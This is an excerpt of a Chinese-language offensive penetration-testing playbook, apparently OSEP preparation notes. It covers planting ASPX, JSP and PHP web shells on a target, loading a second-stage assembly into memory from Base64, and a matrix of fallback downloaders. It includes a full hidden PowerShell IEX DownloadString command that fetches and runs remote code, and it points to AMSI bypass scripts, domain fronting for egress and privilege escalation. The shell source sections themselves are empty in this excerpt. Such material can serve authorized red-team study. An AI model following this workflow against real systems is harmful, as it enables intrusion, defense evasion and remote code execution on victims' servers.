...
> 覆盖场景：14、15、16
> cheat sheet 依据：`Payloads` → `WebShells`（ASPX / JSP / PHP）、`Utilities`（Encode PowerShell Payloads / Encryptors）、`Defense Evasion`（Enumerate Defenses）
...
1. 准备三份材料：
   | 文件 | 用途 |
   |---|---|
   | `scripts/aspx/m10-minimal-exec.aspx` | 精简执行入口（无 UI、无花哨功能） |
   | `scripts/aspx/m10-managed-loader.aspx` | 加载托管程序集/内存执行 |
   | `scripts/aspx/m10-jsp-shell.jsp` / `m10-php-shell.php` | 其它运行时的备选 |
...
5. 拿到稳定执行后：若有 `SeImpersonatePrivilege` → 转 [`docs/06-uac-windows-privesc.md`](/modules/06-uac-windows-privesc) 场景 26。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/aspx/m10-minimal-exec.aspx` | 精简命令执行 | `cmd` 参数 |
| `scripts/aspx/m10-managed-loader.aspx` | 托管程序集内存加载 | `b64` 参数 |
| `scripts/aspx/m10-jsp-shell.jsp` / `m10-php-shell.php` | 非 IIS 环境备选 | `cmd` |
| `scripts/infra/m10-download-fallbacks.md` | 下载器备选矩阵 | — |


#### 源码 `scripts/aspx/m10-minimal-exec.aspx` {#scripts-aspx-m10-minimal-exec-aspx}
...
#### 源码 `scripts/aspx/m10-managed-loader.aspx` {#scripts-aspx-m10-managed-loader-aspx}
...
占位符：TARGET=目标站点；LHOST/URL=程序集来源（本页不主动下载，需下载时配合 scripts/infra/m10-download-fallbacks.md）；
...
#### 源码 `scripts/aspx/m10-jsp-shell.jsp` {#scripts-aspx-m10-jsp-shell-jsp}
...
#### 源码 `scripts/infra/m10-download-fallbacks.md` {#scripts-infra-m10-download-fallbacks-md}
...
> 依赖：攻击机侧投递服务 `python3 scripts/python/m00-delivery-server.py --port 80 --dir ~/osep/payloads`
...
| 4 | PowerShell `DownloadString`（内存，不落地） | `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL')"` | 长 | 注意 AMSI（见 `scripts/powershell/m05-amsi-bypass-variants.ps1`）；被 AMSI/CLM 拦 → 换 5 |
...
| 脚本 | 用途 |
|---|---|
| `scripts/python/m00-delivery-server.py` | 投递 + 请求日志（判断"有没有真的发起请求"） |
| `scripts/aspx/m10-minimal-exec.aspx` | 有 Web Shell 时的长命令执行通道 |
| `scripts/aspx/m10-managed-loader.aspx` | 下载全被拦时，用 Base64 把第二阶段直接传进内存 |
| `scripts/powershell/m05-amsi-bypass-variants.ps1` | PowerShell 下载器被 AMSI 拦时的处理 |
| `scripts/infra/m09-https-listener.sh` | 需要 HTTPS 投递时起 TLS 监听 |
````
...
**准备（攻击机侧）**：准备下载器备选矩阵（`scripts/infra/m10-download-fallbacks.md`）
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/infra/m10-download-fallbacks.md` | 下载器备选矩阵与命令 | LHOST/URL |
| `scripts/aspx/m10-minimal-exec.aspx` | 有 Web Shell 时的替代执行通道 | `cmd` |

**验证**：投递服务日志出现目标 IP 的请求；目标侧文件存在且哈希一致；执行后有回连或输出。

**失败分支与备选**：
1. **所有下载器都被拦** → 改用"上传"通道（Web Shell/上传点）或内嵌 Base64 分段写入。
2. **只允许特定域名出网** → 域前置 / 代理（[`docs/09-c2-egress-channels.md`](/modules/09-c2-egress-channels)）。
...
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `scripts/infra/m10-download-fallbacks.md` | 短命令下载模板 | LHOST |
| `scripts/aspx/m10-minimal-exec.aspx` | 有 Web Shell 时的长命令通道 | `cmd` |
...
| 目的 | 命令/要点 |
|---|---|
| 精简 ASPX 执行 | `scripts/aspx/m10-minimal-exec.aspx`（访问时加 `?cmd=whoami`） |
| 内存加载第二阶段 | `scripts/aspx/m10-managed-loader.aspx?b64=...` |
...
| 脚本 | 说明 |
|---|---|
| `scripts/aspx/m10-minimal-exec.aspx` | 精简执行入口 |
| `scripts/aspx/m10-managed-loader.aspx` | 托管程序集加载 |
| `scripts/aspx/m10-jsp-shell.jsp` | JSP 备选 |
| `scripts/aspx/m10-php-shell.php` | PHP 备选 |
| `scripts/infra/m10-download-fallbacks.md` | 下载器备选矩阵 |
| `scripts/powershell/m05-amsi-bypass-variants.ps1` | PowerShell 下载时的 AMSI 处理 |
| `scripts/python/m00-delivery-server.py` | 投递与请求日志 |

#### 源码 `scripts/aspx/m10-php-shell.php` {#scripts-aspx-m10-php-shell-php}
